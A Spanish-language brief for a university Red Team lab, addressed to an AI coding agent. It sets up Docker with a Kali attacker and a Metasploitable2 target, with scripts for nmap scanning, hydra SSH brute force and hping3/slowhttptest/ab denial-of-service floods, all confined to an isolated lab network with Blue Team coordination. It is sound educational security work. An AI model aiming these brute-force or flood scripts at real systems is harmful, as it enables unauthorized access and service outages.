# Red Team Lab — Brief del proyecto

> **Para Claude Code en modo plan:** este documento es el contexto completo para arrancar la implementación del laboratorio Red Team del Proyecto Final de Redes 2. Léelo de principio a fin antes de proponer un plan de ejecución.
>
> Hay tres tipos de contenido en este brief:
> 1. **Decisiones cerradas** — no las cuestiones, son resultado de un análisis previo con el equipo.
> 2. **Decisiones abiertas** — propón una alternativa con justificación técnica.
> 3. **Especificaciones e implementaciones de referencia** — son borrador; ajusta nombres, estructura o flags si tienes una mejor propuesta, pero respeta el comportamiento esperado.

---

## Tabla de contenidos

1. [Contexto del proyecto](#1-contexto-del-proyecto)
2. [Decisiones técnicas tomadas](#2-decisiones-técnicas-tomadas)
3. [Decisión abierta: observabilidad de red (Docker vs GNS3)](#3-decisión-abierta-observabilidad-de-red)
4. [Estructura propuesta del repositorio](#4-estructura-propuesta-del-repositorio)
5. [docker-compose.yml de referencia](#5-docker-composeyml-de-referencia)
6. [Scripts de scanning automatizados por fase](#6-scripts-de-scanning-automatizados-por-fase)
7. [Playbook detallado del DoS](#7-playbook-detallado-del-dos)
8. [Entregables del proyecto y mapeo a archivos](#8-entregables-del-proyecto-y-mapeo-a-archivos)
9. [Plan de ejecución sugerido](#9-plan-de-ejecución-sugerido)
10. [Restricciones y reglas operativas](#10-restricciones-y-reglas-operativas)

---

## 1. Contexto del proyecto

**Curso:** Redes 2, sección de los sábados, ciclo 2026.
**Proyecto:** Simulación de ataque y defensa en redes (Red Team vs Blue Team).
**Rol del equipo:** Red Team (ofensiva).
**Tamaño del equipo:** 5–6 estudiantes.
**Fechas clave:**
- Revisión previa con docente: **16 de mayo**
- Entrega final: **23 de mayo**

### Alcance del Red Team

El equipo es responsable de identificar vulnerabilidades, ejecutar ataques controlados, documentar hallazgos y entregar un informe técnico. **No** configura servidores, firewalls, ni mecanismos de defensa — eso es del Blue Team.

### Entregables exigidos por el docente al Red Team

1. Documento con vulnerabilidades encontradas.
2. Evidencia de ataques (capturas de pantalla, comandos, salidas).
3. Descripción de las técnicas utilizadas.
4. Impacto logrado (accesos, servicios comprometidos, downtime).

El proyecto exige ejecutar **mínimo 3** de las técnicas listadas (escaneo de red, escaneo de puertos, credenciales débiles, enumeración, web vulnerable). El plan ejecuta **al menos 4** para tener margen.

### Documento de planificación previo

Ya existe un documento Word (`Plan_Red_Team.docx`) con la planificación, organización del equipo, cronograma, infraestructura, guía de ataques y playbook DoS. Este brief técnico complementa ese documento aterrizándolo en código y configuración.

---

## 2. Decisiones técnicas tomadas

Estas decisiones son resultado de un análisis previo con el equipo. **No las revises**, solo aplícalas.

| Decisión | Elección | Por qué |
|---|---|---|
| Plataforma de ejecución | **Docker** | Recursos limitados, OS reales necesarios para que las herramientas funcionen, setup rápido. |
| Sistema atacante | **Kali Linux** (`kalilinux/kali-rolling`) | Imagen oficial mantenida; superficie completa de herramientas ofensivas. |
| Sistema objetivo principal | **Metasploitable2** (`tleemcjr/metasploitable2`) | Una sola imagen cubre múltiples servicios vulnerables: SSH débil, HTTP, FTP anónimo, SMB viejo, MySQL. Permite ejecutar 4–5 técnicas distintas sin construir el server desde cero. |
| Topología | Red Docker bridge `lab-net` con subred `172.20.0.0/24` | Aislamiento del host, IPs fijas para reproducibilidad. |
| Metodología | **PTES simplificado** (Recon → Scan → Enum → Exploit → DoS → Post → Report) | Estándar reconocido, ordena el informe automáticamente. |
| Packet Tracer | **Solo para diagrama del informe** | PT no soporta servicios reales; sus "servidores" son maquetas funcionales. Sirve como capa visual del informe (capítulo 5 del Word doc), no para ejecutar ataques. |
| IPs fijas en lab-net | Kali = `.10`, Server = `.20`, Cliente1 = `.30`, Cliente2 = `.31` | Reproducibilidad de scripts y evidencia. |
| Persistencia de evidencia | Volumen `./evidence` montado en `/root/loot` del Kali | Sobrevive a recreaciones del contenedor; gitignored. |

---

## 3. Decisión abierta: observabilidad de red

### El requerimiento

El proyecto no es solo "atacar y defender". Para que el ejercicio tenga valor educativo y entregue evidencia útil al informe, ambos equipos necesitan **ver el tráfico real** que circula en la red durante los ataques: pcaps, flujos, picos de tráfico, alertas de IDS. Sin eso, el Blue Team no puede documentar su detección y el Red Team no puede demostrar el impacto técnico de sus ataques.

### Opción A: Docker + stack de observabilidad (recomendado)

Mantener Docker como única plataforma y agregar contenedores específicos para visibilidad.

**Componentes:**
- **tcpdump** corriendo dentro del contenedor Kali para capturar el tráfico ofensivo desde el origen.
- **tcpdump host-side** sobre la interfaz del bridge `lab-net` para capturar todo el tráfico inter-contenedor (este es el más completo).
- **ntopng** como contenedor con `network_mode: host`, sniffeando el bridge de `lab-net` y exponiendo dashboard web en `:3000`.
- **Suricata** opcional, en perfil avanzado, como IDS que genere alertas estructuradas.
- **Wireshark** instalado en el host del operador para análisis offline de pcaps.

**Ventajas:**
- Mismo stack que ya está planeado; un solo `docker compose up`.
- Bajo consumo de recursos.
- Datos crudos (pcap) que son la evidencia real para el informe.
- Plan mode puede orquestar todo sin dependencias externas.

**Limitaciones:**
- No hay topología "animada" — el Blue Team ve flujos y paquetes, no una vista tipo CCNA con paquetes viajando entre routers en pantalla.

### Opción B: GNS3 + Docker (escalación)

Usar GNS3 como contenedor visual de la topología, importando los contenedores Docker como nodos. GNS3 acepta nodos Docker nativamente desde la versión 2.x, por lo que **no hay que reescribir nada** del lado de los contenedores.

**Componentes:**
- GNS3 server (puede correr en una VM o en Linux nativo).
- Importación de las imágenes `kalilinux/kali-rolling` y `tleemcjr/metasploitable2` como templates.
- Posible adición de un router virtual (vIOS, vyos) para añadir realismo de capa 3.
- Wireshark integrado por enlace (built-in en GNS3).

**Ventajas:**
- Visualización topológica de alto impacto para la presentación del 16 de mayo y para el informe final.
- Wireshark por enlace es plug-and-play, sin scripts.
- Si se incluye un router, se puede ejercitar ACLs y NAT (más cercano a un curso de Redes 2).

**Limitaciones:**
- Setup pesado: GNS3 server, configuración de templates, ~6–8 GB RAM mínimo en el host.
- Curva de aprendizaje del equipo si nadie lo ha usado.
- Tiempo limitado: quedan ~3 semanas y la prioridad es ejecutar ataques, no aprender una herramienta nueva.

### Recomendación al plan mode

**Empezar con Opción A.** Es la ruta de menor riesgo y entrega los datos crudos que el informe exige. La observabilidad real (pcap, flujos, alertas) está cubierta.

**Escalar a Opción B condicionalmente** si se cumple cualquiera de:
- Algún miembro del equipo ya domina GNS3 y puede liderar.
- Después de la revisión previa (16 de mayo) el docente sugiere visualización topológica.
- El Blue Team prefiere GNS3 y se coordina la integración.

Plan mode debe **proponer Opción A** como ruta inicial y dejar la migración a B como un anexo de "trabajo futuro" que **no se ejecuta** salvo decisión explícita posterior.

### Si se decide GNS3 (no por defecto)

El cambio de Docker Compose a GNS3 es de orquestación, no de imágenes. Las mismas imágenes y los mismos scripts funcionan. El único trabajo adicional es:
1. Configurar GNS3 server.
2. Importar las imágenes Docker como templates en GNS3.
3. Reconstruir la topología visualmente.
4. Coordinar con Blue Team el host que correrá GNS3.

---

## 4. Estructura propuesta del repositorio

```
red-team-lab/
├── README.md                          # Setup rápido y comandos clave
├── .gitignore                         # Ignora evidence/, .env, capturas
│
├── docker/
│   ├── docker-compose.yml             # Stack: atacante + objetivo + clientes + observabilidad
│   ├── kali/
│   │   ├── Dockerfile                 # Kali con tools pre-instaladas
│   │   └── tools.list                 # Paquetes a instalar
│   └── README.md                      # Cómo levantar el stack
│
├── scripts/
│   ├── lib/
│   │   ├── common.sh                  # Funciones compartidas (logging, timestamps, evidence dirs)
│   │   └── colors.sh                  # ANSI helpers
│   │
│   ├── phase-1-recon/
│   │   └── recon.sh                   # Ping sweep + DNS + banner grab
│   │
│   ├── phase-2-scanning/
│   │   ├── port-scan.sh               # nmap completo TCP
│   │   ├── service-detect.sh          # nmap -sV -O + scripts vuln
│   │   └── udp-scan.sh                # UDP top-50 (selectivo)
│   │
│   ├── phase-3-enumeration/
│   │   ├── enum-smb.sh                # enum4linux + smbclient
│   │   ├── enum-http.sh               # nikto + gobuster + whatweb
│   │   ├── enum-ssh.sh                # banner + algos soportados
│   │   └── enum-ftp.sh                # anonymous login check
│   │
│   ├── phase-4-credentials/
│   │   ├── default-creds.sh           # Probar admin/admin, root/root, etc. ANTES de hydra
│   │   └── brute-force.sh             # Wrappers de hydra por servicio
│   │
│   ├── phase-5-exploitation/
│   │   ├── web-sqli.sh                # sqlmap automático
│   │   └── web-shells.sh              # Intentos de upload + LFI
│   │
│   ├── phase-6-dos/
│   │   ├── 00-baseline.sh             # Línea base de latencia ANTES del ataque
│   │   ├── 01-slowloris.sh            # Vector 1: capa de aplicación
│   │   ├── 02-http-flood.sh           # Vector 2: Apache Bench
│   │   ├── 03-syn-flood.sh            # Vector 3: hping3 SYN flood
│   │   ├── 99-monitor.sh              # Loop de monitoreo durante ataques
│   │   ├── recovery-check.sh          # Verifica que el servicio se recuperó
│   │   └── run-dos-window.sh          # Wrapper interactivo con confirmaciones
│   │
│   └── phase-7-post-exploitation/
│       └── privesc-check.sh           # linpeas wrapper si hay shell
│
├── observability/
│   ├── start-pcap.sh                  # Lanza tcpdump host-side sobre el bridge lab-net
│   ├── stop-pcap.sh
│   └── README.md                      # Cómo abrir pcaps en Wireshark, dashboard ntopng
│
├── playbooks/
│   ├── dos-playbook.md                # Playbook detallado: ventana, métricas, formato
│   ├── recon-coordination.md          # Cómo coordinar el inicio con Blue Team
│   └── evidence-format.md             # Estándar de bitácora y capturas
│
├── evidence/                          # gitignored — output de los scripts
│   ├── phase-1/
│   ├── phase-2/
│   ├── ...
│   └── pcap/                          # Capturas de tráfico
│
└── reports/
    └── Plan_Red_Team.docx             # Documento ya generado en planificación
```

**Convenciones que plan mode debe respetar:**
- Cada script genera un subdirectorio con timestamp en `evidence/phase-N/<YYYYMMDD-HHMMSS>/`.
- Cada script registra en `evidence/phase-N/<ts>/run.log` el comando ejecutado, fecha de inicio/fin y un resumen.
- Los scripts no asumen nada sobre el target salvo lo que reciben por argumento o variable de entorno.
- Variables de entorno comunes: `LAB_TARGET=172.20.0.20`, `LAB_NETWORK=172.20.0.0/24`.

---

## 5. docker-compose.yml de referencia

Esta es la implementación de referencia. Plan mode puede ajustar nombres, profiles o agregar healthchecks, pero el comportamiento esperado es:
- `docker compose up -d` levanta atacante + objetivo + clientes mínimos.
- `docker compose --profile observability up -d` agrega ntopng y captura de tráfico.
- `docker compose exec kali bash` da shell en el atacante con scripts montados en `/root/scripts`.

```yaml
# docker/docker-compose.yml
name: red-team-lab

networks:
  lab-net:
    name: lab-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1

services:
  # =====================================================
  # ATACANTE — Red Team
  # =====================================================
  kali:
    build:
      context: ./kali
      dockerfile: Dockerfile
    image: redteam/kali:latest
    container_name: redteam-kali
    hostname: kali-attacker
    networks:
      lab-net:
        ipv4_address: 172.20.0.10
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ../scripts:/root/scripts:ro
      - ../playbooks:/root/playbooks:ro
      - ../evidence:/root/loot
    working_dir: /root
    tty: true
    stdin_open: true
    command: /bin/bash

  # =====================================================
  # OBJETIVO — gestionado por Blue Team en escenario real,
  # aquí lo levantamos para poder ejecutar y validar scripts.
  # =====================================================
  target-server:
    image: tleemcjr/metasploitable2:latest
    container_name: blueteam-target
    hostname: vulnerable-server
    networks:
      lab-net:
        ipv4_address: 172.20.0.20
    # Metasploitable2 expone intencionalmente:
    # SSH(22), Telnet(23), FTP(21), HTTP(80), SMB(139,445),
    # MySQL(3306), PostgreSQL(5432), VNC(5900), entre otros.

  # =====================================================
  # CLIENTES — para topología más realista (opcional)
  # =====================================================
  client-1:
    image: ubuntu:22.04
    container_name: blueteam-client-1
    hostname: client-1
    networks:
      lab-net:
        ipv4_address: 172.20.0.30
    command: ["sleep", "infinity"]
    profiles: [full]

  client-2:
    image: ubuntu:22.04
    container_name: blueteam-client-2
    hostname: client-2
    networks:
      lab-net:
        ipv4_address: 172.20.0.31
    command: ["sleep", "infinity"]
    profiles: [full]

  # =====================================================
  # OBSERVABILIDAD — Opción A
  # =====================================================
  ntopng:
    image: ntop/ntopng:stable
    container_name: lab-ntopng
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
    command:
      - "--community"
      - "-i"
      - "br-lab"           # Plan mode: validar el nombre real del bridge tras 'docker network inspect lab-net'
      - "-w"
      - "3000"
    profiles: [observability]

  # Suricata como IDS — opcional, perfil avanzado
  suricata:
    image: jasonish/suricata:latest
    container_name: lab-suricata
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
      - SYS_NICE
    volumes:
      - ../evidence/suricata:/var/log/suricata
    command:
      - "-i"
      - "br-lab"
    profiles: [advanced]
```

**Notas para plan mode:**
- El nombre del bridge (`br-lab` en el YAML) es ilustrativo; Docker genera nombres como `br-abc123def456`. Plan mode debe agregar al `README.md` o a un script de bootstrap el comando para resolver el nombre real:
  ```bash
  docker network inspect lab-net -f '{{.Id}}' | cut -c1-12 | xargs -I{} echo "br-{}"
  ```
- La captura host-side va por script (`observability/start-pcap.sh`), no por compose, porque requiere root y el nombre dinámico del bridge.
- Si Metasploitable2 no levanta directamente (algunas versiones tienen problemas con healthchecks), considerar `vulnerables/metasploitable2` o construir manualmente desde un Ubuntu 22.04 + paquetes vulnerables documentados.

### Dockerfile del Kali

```dockerfile
# docker/kali/Dockerfile
FROM kalilinux/kali-rolling

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    nmap hydra nikto gobuster enum4linux \
    hping3 slowhttptest apache2-utils \
    netcat-openbsd dnsutils whois \
    sqlmap metasploit-framework \
    tcpdump tshark \
    curl wget vim less jq \
    iputils-ping iproute2 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /root
```

---

## 6. Scripts de scanning automatizados por fase

Plan mode debe implementar todos los scripts siguiendo el patrón compartido de abajo. Cada script debe ser ejecutable, tener encabezado estándar y producir evidencia estructurada.

### Patrón compartido — `scripts/lib/common.sh`

```bash
#!/usr/bin/env bash
# Funciones compartidas para todos los scripts del Red Team Lab

set -euo pipefail

LAB_TARGET="${LAB_TARGET:-172.20.0.20}"
LAB_NETWORK="${LAB_NETWORK:-172.20.0.0/24}"
EVIDENCE_ROOT="${EVIDENCE_ROOT:-/root/loot}"

# Crea un directorio de evidencia con timestamp para la fase actual
init_evidence_dir() {
    local phase="$1"
    local ts
    ts=$(date +%Y%m%d-%H%M%S)
    EVIDENCE_DIR="${EVIDENCE_ROOT}/${phase}/${ts}"
    mkdir -p "$EVIDENCE_DIR"
    echo "$EVIDENCE_DIR"
}

# Logger estructurado: timestamp + nivel + mensaje
log() {
    local level="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${ts}] [${level}] ${msg}" | tee -a "${EVIDENCE_DIR:-/tmp}/run.log"
}

# Encabezado estándar al inicio de un script
banner() {
    local title="$1"
    cat <<EOF | tee -a "${EVIDENCE_DIR}/run.log"
================================================================
 ${title}
 Target  : ${LAB_TARGET}
 Network : ${LAB_NETWORK}
 Date    : $(date '+%Y-%m-%d %H:%M:%S')
 Output  : ${EVIDENCE_DIR}
================================================================
EOF
}

# Cierre estándar: footer + tar.gz comprimido para adjuntar al informe
finalize() {
    log INFO "Evidence saved at: ${EVIDENCE_DIR}"
    log INFO "Files generated:"
    ls -la "${EVIDENCE_DIR}" | tee -a "${EVIDENCE_DIR}/run.log"
}
```

### Fase 1 — `scripts/phase-1-recon/recon.sh`

```bash
#!/usr/bin/env bash
# Reconocimiento básico: hosts vivos en la subred y banner grabbing del objetivo

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(init_evidence_dir "phase-1-recon")
banner "Phase 1 — Reconnaissance"

# 1. Ping sweep
log INFO "Ping sweep over ${LAB_NETWORK}"
nmap -sn "${LAB_NETWORK}" -oN "${EVIDENCE_DIR}/ping-sweep.txt"

# 2. Banner grabbing en puertos comunes del target
log INFO "Banner grabbing on common ports"
for port in 21 22 23 25 80 139 443 445 3306; do
    timeout 3 bash -c "echo '' | nc -v -w 2 ${LAB_TARGET} ${port}" \
        >> "${EVIDENCE_DIR}/banners.txt" 2>&1 || true
done

# 3. DNS reverse (si aplica)
log INFO "Reverse DNS lookup"
dig -x "${LAB_TARGET}" +short > "${EVIDENCE_DIR}/dns-reverse.txt" || true

finalize
```

### Fase 2 — `scripts/phase-2-scanning/port-scan.sh`

```bash
#!/usr/bin/env bash
# Escaneo TCP completo con detección de versión

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(init_evidence_dir "phase-2-scanning")
banner "Phase 2 — Full TCP scan + version detection"

# Escaneo SYN completo (todos los puertos), con versión, OS y scripts default
log INFO "Running nmap -sS -sV -O -p- (this may take 5-10 minutes)"
nmap -sS -sV -O -p- \
    --min-rate 1000 \
    -oA "${EVIDENCE_DIR}/full-scan" \
    "${LAB_TARGET}"

# Resumen de puertos abiertos
log INFO "Generating open-ports summary"
grep "/open/" "${EVIDENCE_DIR}/full-scan.gnmap" \
    | tr ',' '\n' \
    | grep "/open/" \
    | awk -F/ '{print $1, $5}' \
    > "${EVIDENCE_DIR}/open-ports.txt" || true

# Scripts NSE de vulnerabilidades sobre los puertos abiertos
log INFO "Running NSE vuln scripts"
nmap --script vuln \
    -oN "${EVIDENCE_DIR}/vuln-scripts.txt" \
    "${LAB_TARGET}"

finalize
```

### Fase 3 — `scripts/phase-3-enumeration/enum-http.sh`

```bash
#!/usr/bin/env bash
# Enumeración del servicio HTTP

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(init_evidence_dir "phase-3-enumeration")
banner "Phase 3 — HTTP enumeration"

PORT="${1:-80}"
WORDLIST="${2:-/usr/share/wordlists/dirb/common.txt}"
URL="http://${LAB_TARGET}:${PORT}"

log INFO "Target URL: ${URL}"

# Nikto
log INFO "Running nikto"
nikto -h "${URL}" -o "${EVIDENCE_DIR}/nikto.txt" || true

# Gobuster
log INFO "Running gobuster with ${WORDLIST}"
gobuster dir -u "${URL}" -w "${WORDLIST}" \
    -o "${EVIDENCE_DIR}/gobuster.txt" \
    -q 2>&1 | tee "${EVIDENCE_DIR}/gobuster.log" || true

# Whatweb
log INFO "Running whatweb"
whatweb -v "${URL}" > "${EVIDENCE_DIR}/whatweb.txt" 2>&1 || true

finalize
```

### Fase 4 — `scripts/phase-4-credentials/brute-force.sh`

```bash
#!/usr/bin/env bash
# Brute force con hydra contra SSH del objetivo
# IMPORTANTE: probar credenciales por defecto manualmente ANTES con default-creds.sh

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(init_evidence_dir "phase-4-credentials")
banner "Phase 4 — Credential brute force (SSH)"

USER_LIST="${1:-/usr/share/wordlists/metasploit/unix_users.txt}"
PASS_LIST="${2:-/usr/share/wordlists/rockyou.txt.gz}"

# Descomprimir rockyou si está comprimido
if [[ "$PASS_LIST" == *.gz ]]; then
    log INFO "Decompressing wordlist"
    gunzip -k "$PASS_LIST" || true
    PASS_LIST="${PASS_LIST%.gz}"
fi

log INFO "User list: ${USER_LIST}"
log INFO "Pass list: ${PASS_LIST}"
log WARN "Limiting to first 100 passwords to keep the run reasonable"
head -100 "$PASS_LIST" > "${EVIDENCE_DIR}/passwords-trimmed.txt"

hydra -L "${USER_LIST}" -P "${EVIDENCE_DIR}/passwords-trimmed.txt" \
    -t 4 -V -f \
    -o "${EVIDENCE_DIR}/hydra-results.txt" \
    "ssh://${LAB_TARGET}" 2>&1 | tee "${EVIDENCE_DIR}/hydra.log" || true

finalize
```

Plan mode debe replicar este patrón para los demás scripts (UDP scan, enum SMB/SSH/FTP, default-creds, web SQLi, post-exploitation). El criterio de aceptación es: cada script puede ejecutarse de forma independiente, deja evidencia estructurada y usa el target/network desde variables de entorno.

---

## 7. Playbook detallado del DoS

Esta es la fase con más riesgo operativo. La especificación es completa porque la coordinación importa tanto como el código.

### Reglas no negociables

| Regla | Razón |
|---|---|
| Duración máxima por vector: **60–120 segundos** | Demostrar el vector sin destruir el servicio. |
| Solo dentro de `lab-net` (`172.20.0.0/24`) | Regla del proyecto, no negociable. |
| Blue Team avisado por escrito y monitoreando | Sin esto, el ejercicio no enseña detección. |
| Pausa de **5 minutos** entre vectores | Permitir recuperación y revisión de logs. |
| Si el servicio cae > **3 minutos**, abortar | Margen de seguridad operativa. |
| Línea base obligatoria antes de cualquier ataque | Sin baseline, las métricas de impacto no significan nada. |

### Métricas a capturar

#### Antes (línea base) — `scripts/phase-6-dos/00-baseline.sh`

```bash
#!/usr/bin/env bash
# Línea base de latencia y disponibilidad ANTES del ataque

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(init_evidence_dir "phase-6-dos")
export EVIDENCE_DIR  # Compartido con scripts hijos

banner "Phase 6 — DoS — Baseline measurement"

PORT="${1:-80}"
URL="http://${LAB_TARGET}:${PORT}/"

log INFO "Capturing baseline. Target: ${URL}"

# Latencia con curl, 30 muestras a 1 muestra/segundo
log INFO "30-sample latency baseline"
{
    echo "timestamp,http_code,time_total"
    for i in {1..30}; do
        TS=$(date +%H:%M:%S)
        OUT=$(curl -s -o /dev/null \
            -w '%{http_code},%{time_total}' \
            --max-time 5 "$URL" 2>&1 || echo "000,5.000")
        echo "${TS},${OUT}"
        sleep 1
    done
} > "${EVIDENCE_DIR}/baseline-curl.csv"

# Apache Bench: 100 requests, concurrencia 5
log INFO "Apache Bench baseline (100 req, c=5)"
ab -n 100 -c 5 "$URL" > "${EVIDENCE_DIR}/baseline-ab.txt" 2>&1

# Resumen
log INFO "Baseline summary:"
grep -E "(Requests per second|Time per request|Failed requests)" \
    "${EVIDENCE_DIR}/baseline-ab.txt" | tee -a "${EVIDENCE_DIR}/run.log"

# Guardar EVIDENCE_DIR para que los vectores escriban en el mismo run
echo "${EVIDENCE_DIR}" > /tmp/dos-evidence-dir

finalize
```

#### Durante (monitor) — `scripts/phase-6-dos/99-monitor.sh`

```bash
#!/usr/bin/env bash
# Monitor continuo durante el ataque
# Lanzar en otra terminal del Kali: bash 99-monitor.sh

source "$(dirname "$0")/../lib/common.sh"

EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir 2>/dev/null || init_evidence_dir "phase-6-dos")

PORT="${1:-80}"
URL="http://${LAB_TARGET}:${PORT}/"
DURATION="${2:-180}"  # segundos a monitorear (default 3 minutos)

OUT="${EVIDENCE_DIR}/monitor-$(date +%H%M%S).csv"
echo "timestamp,http_code,time_total" > "$OUT"

log INFO "Monitoring ${URL} for ${DURATION}s -> ${OUT}"

END=$(($(date +%s) + DURATION))
while [ "$(date +%s)" -lt "$END" ]; do
    TS=$(date +%H:%M:%S)
    OUT_LINE=$(curl -s -o /dev/null \
        -w '%{http_code},%{time_total}' \
        --max-time 5 "$URL" 2>&1 || echo "000,5.000")
    echo "${TS},${OUT_LINE}" >> "$OUT"
    sleep 1
done

log INFO "Monitor finished. CSV: $OUT"
```

#### Después (recovery) — `scripts/phase-6-dos/recovery-check.sh`

```bash
#!/usr/bin/env bash
# Verifica que el servicio recuperó valores normales tras el ataque

source "$(dirname "$0")/../lib/common.sh"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir)

PORT="${1:-80}"
URL="http://${LAB_TARGET}:${PORT}/"

log INFO "Recovery check: 10 samples"
{
    echo "sample,http_code,time_total"
    for i in {1..10}; do
        OUT=$(curl -s -o /dev/null \
            -w '%{http_code},%{time_total}' \
            --max-time 5 "$URL" 2>&1 || echo "000,5.000")
        echo "${i},${OUT}"
        sleep 2
    done
} | tee "${EVIDENCE_DIR}/recovery-check.csv"

log INFO "Compare with baseline-curl.csv to confirm recovery"
```

### Vectores de ataque

#### Vector 1 — `scripts/phase-6-dos/01-slowloris.sh`

```bash
#!/usr/bin/env bash
# Slowloris: agota workers HTTP con conexiones lentas

source "$(dirname "$0")/../lib/common.sh"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir)
banner "DoS Vector 1 — Slowloris"

PORT="${1:-80}"
DURATION_MS=60000  # 60 segundos

log INFO "Starting Slowloris against ${LAB_TARGET}:${PORT} for 60s"
log WARN "Notify Blue Team NOW. Press Enter to start, Ctrl+C to abort."
read -r

# Capturar pcap propio del ataque desde Kali
tcpdump -i any -w "${EVIDENCE_DIR}/slowloris.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

START=$(date +%s)
slowhttptest -c 500 -H -i 10 -r 200 -t GET \
    -u "http://${LAB_TARGET}:${PORT}/" \
    -x 24 -p 3 \
    -l 60 \
    -g -o "${EVIDENCE_DIR}/slowloris-report" 2>&1 \
    | tee "${EVIDENCE_DIR}/slowloris.log"
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 1 finished. Duration: $((END-START))s"
log INFO "Evidence: slowloris-report.html, slowloris.pcap, slowloris.log"
```

#### Vector 2 — `scripts/phase-6-dos/02-http-flood.sh`

```bash
#!/usr/bin/env bash
# HTTP flood con Apache Bench

source "$(dirname "$0")/../lib/common.sh"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir)
banner "DoS Vector 2 — HTTP Flood (Apache Bench)"

PORT="${1:-80}"
URL="http://${LAB_TARGET}:${PORT}/"

log WARN "5-minute pause from previous vector required. Continue? (y/N)"
read -r answer
[[ "$answer" != "y" ]] && exit 1

log INFO "Capturing pcap and running ab"
tcpdump -i any -w "${EVIDENCE_DIR}/http-flood.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

START=$(date +%s)
# 50,000 requests, concurrencia 1000, timeout 60s total
ab -n 50000 -c 1000 -t 60 -r "${URL}" \
    > "${EVIDENCE_DIR}/http-flood-ab.txt" 2>&1
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 2 finished. Duration: $((END-START))s"
log INFO "Key metrics:"
grep -E "(Requests per second|Time per request|Failed requests|Non-2xx)" \
    "${EVIDENCE_DIR}/http-flood-ab.txt" | tee -a "${EVIDENCE_DIR}/run.log"
```

#### Vector 3 — `scripts/phase-6-dos/03-syn-flood.sh`

```bash
#!/usr/bin/env bash
# SYN flood con hping3
# Requiere NET_RAW en el contenedor Kali

source "$(dirname "$0")/../lib/common.sh"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir)
banner "DoS Vector 3 — SYN Flood (hping3)"

PORT="${1:-80}"
DURATION="${2:-30}"

log WARN "MOST DISRUPTIVE VECTOR. Confirm Blue Team is monitoring. (y/N)"
read -r answer
[[ "$answer" != "y" ]] && exit 1

log INFO "Capturing pcap"
tcpdump -i any -w "${EVIDENCE_DIR}/syn-flood.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

log INFO "Running hping3 SYN flood for ${DURATION}s"
START=$(date +%s)
timeout "${DURATION}" hping3 -S --flood --rand-source \
    -p "${PORT}" "${LAB_TARGET}" \
    > "${EVIDENCE_DIR}/syn-flood.log" 2>&1 || true
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 3 finished. Duration: $((END-START))s"
log WARN "Service may take longer than other vectors to recover"
```

#### Wrapper — `scripts/phase-6-dos/run-dos-window.sh`

```bash
#!/usr/bin/env bash
# Orquesta toda la ventana de DoS con confirmaciones humanas

set -euo pipefail
DIR="$(dirname "$0")"

echo "============================================"
echo " DoS WINDOW — Coordinated attack execution"
echo "============================================"
echo ""
echo "Pre-flight checklist:"
echo "  [ ] Blue Team notified and monitoring"
echo "  [ ] Window agreed (start time / end time)"
echo "  [ ] Abort signal channel established"
echo ""
read -p "All confirmed? Type YES to continue: " confirm
[[ "$confirm" != "YES" ]] && exit 1

bash "${DIR}/00-baseline.sh"
echo ""
read -p "Baseline captured. Start Vector 1 (Slowloris)? [y/N] " a
[[ "$a" == "y" ]] && bash "${DIR}/01-slowloris.sh"

echo "Pausing 5 minutes for service recovery and Blue Team review..."
sleep 300
bash "${DIR}/recovery-check.sh"

read -p "Start Vector 2 (HTTP flood)? [y/N] " a
[[ "$a" == "y" ]] && bash "${DIR}/02-http-flood.sh"

echo "Pausing 5 minutes..."
sleep 300
bash "${DIR}/recovery-check.sh"

read -p "Start Vector 3 (SYN flood)? [y/N] " a
[[ "$a" == "y" ]] && bash "${DIR}/03-syn-flood.sh"

echo "Pausing 5 minutes..."
sleep 300
bash "${DIR}/recovery-check.sh"

echo "DoS window complete. Evidence at: $(cat /tmp/dos-evidence-dir)"
```

### Formato de evidencia del DoS

Cada vector ejecutado debe producir:

| Archivo | Contenido |
|---|---|
| `<vector>.pcap` | Captura de tráfico desde Kali durante el ataque. |
| `<vector>.log` | Salida completa de la herramienta. |
| `<vector>-report.html` (Slowloris) | Reporte gráfico autogenerado por slowhttptest. |
| `<vector>-ab.txt` (HTTP flood) | Output de Apache Bench con métricas. |
| `monitor-HHMMSS.csv` | CSV de latencia y códigos HTTP durante el ataque. |
| `recovery-check.csv` | Latencia post-ataque para demostrar recuperación. |
| `run.log` | Log estructurado de toda la ventana con timestamps. |

### Plantilla de bitácora del DoS

Este bloque va al anexo del informe final. Plan mode debe generar el archivo `playbooks/dos-bitacora-template.md` con esta plantilla.

```
Vector:                   [ Slowloris | HTTP flood | SYN flood ]
Operador:                 ___________________________
Hora inicio (HH:MM:SS):   ___________________________
Hora fin (HH:MM:SS):      ___________________________
Duración real (segundos): ___________________________
Comando exacto:           ___________________________
Latencia base (ms):       ___________________________
Latencia pico (ms):       ___________________________
Códigos HTTP observados:  ___________________________
Servicio caído:           [ Sí | No | Degradado ]
Tiempo de recuperación:   ___________________________
Detección por Blue Team:  [ Sí | No | Parcial ]
Notas adicionales:        ___________________________
```

---

